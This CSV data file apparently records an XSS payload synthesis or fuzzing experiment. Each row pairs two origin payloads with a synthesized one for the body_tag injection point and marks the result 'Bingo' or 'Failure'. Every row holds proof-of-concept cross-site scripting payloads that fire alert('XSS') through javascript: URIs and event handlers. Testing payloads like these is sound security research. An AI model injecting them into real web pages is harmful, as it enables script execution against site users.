eval_place,synthesized_code,origin_code1,origin_code2,bingo
body_tag,</div></iframe></div>,"</a><iframe src=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')"">",<img src=x onerror=alert('XSS')></iframe></div>,Failure
body_tag,"<a href=""javascript:alert('XSS')""></iframe><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')>","<a href=""javascript:alert('XSS')""></iframe><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')>","<a href=""javascript:alert('XSS')""></iframe><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')>",Bingo
body_tag,"</a></div><a href=""javascript:alert('XSS')"">","</a><img src=x onerror=alert('XSS')><input type=""text"" value=""XSS"" onfocus=alert('XSS')>","</a><iframe src=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')"">",Failure
body_tag,"<input type=""text"" value=""XSS"" onfocus=alert('XSS')></div><marquee onstart=alert('XSS')>","<a href=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')""></a>","</a><img src=x onerror=alert('XSS')><input type=""text"" value=""XSS"" onfocus=alert('XSS')>",Failure
body_tag,"<a href=""javascript:alert('XSS')""></iframe></div>","<a href=""javascript:alert('XSS')""></iframe><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')>","</a><iframe src=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')"">",Failure
body_tag,"</a></div><input type=""text"" value=""XSS"" onfocus=alert('XSS')>",</a><img src=x onerror=alert('XSS')></iframe>,"<a href=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')"">",Failure
body_tag,"<iframe src=""javascript:alert('XSS')""></div><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')>",</div></div><body onload=alert('XSS')>,"</iframe></div><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')>",Bingo
body_tag,"<a href=""javascript:alert('XSS')""><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')></iframe>","<a href=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')"">","<input type=""text"" value=""XSS"" onfocus=alert('XSS')><body onload=alert('XSS')><iframe src=""javascript:alert('XSS')"">",Bingo
body_tag,"</iframe><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')></div>",</div></div><body onload=alert('XSS')>,"<input type=""text"" value=""XSS"" onfocus=alert('XSS')><body onload=alert('XSS')><iframe src=""javascript:alert('XSS')"">",Bingo
body_tag,"<a href=""javascript:alert('XSS')""><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')><input type=""text"" value=""XSS"" onfocus=alert('XSS')>","<input type=""text"" value=""XSS"" onfocus=alert('XSS')><body onload=alert('XSS')><iframe src=""javascript:alert('XSS')"">",</a><img src=x onerror=alert('XSS')></iframe>,Failure
